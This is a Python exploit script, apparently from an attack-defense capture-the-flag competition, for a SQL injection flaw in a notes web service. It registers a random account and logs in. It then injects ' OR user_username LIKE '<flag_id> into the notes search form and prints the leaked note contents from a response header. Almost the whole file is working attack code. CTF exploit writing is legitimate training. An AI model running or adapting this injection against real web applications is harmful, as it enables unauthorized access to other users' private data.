import random
import string
import sys

import requests

"""

This is the exploit script for vulnerability 1 (SQL Injection)
This program takes 2 arguments:

- service IP (known during competition or 127.0.0.1 if you run locally)
- username (should be provided via flag id; this user has the note which contains the flag;)
        - username is not strictly necessary for the exploit, but narrows down the output when exploiting
"""


def randomString():
    name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
    return name


def exploit(ip, flag_id):
    s = requests.Session()
    base = f"http://{ip}:10100"

    name = randomString()
    email = f"{name}@{name}.com"
    password = "password"

    r = s.post(base + "/register", data={
        "email": email,
        "username": name,
        "password": password})

    r = s.post(base + "/login", data={
        "email": email,
        "password": password
    })

    r = s.post(base + "/notes/search", data={
        "search-form": f"' OR user_username LIKE '{flag_id}"
    })

    contains_flag = r.headers['notes-result']
    print(f"FLAG IS HERE: {contains_flag}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.stderr.write('Usage: ./exploit1.py IP FLAG_ID\n')
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
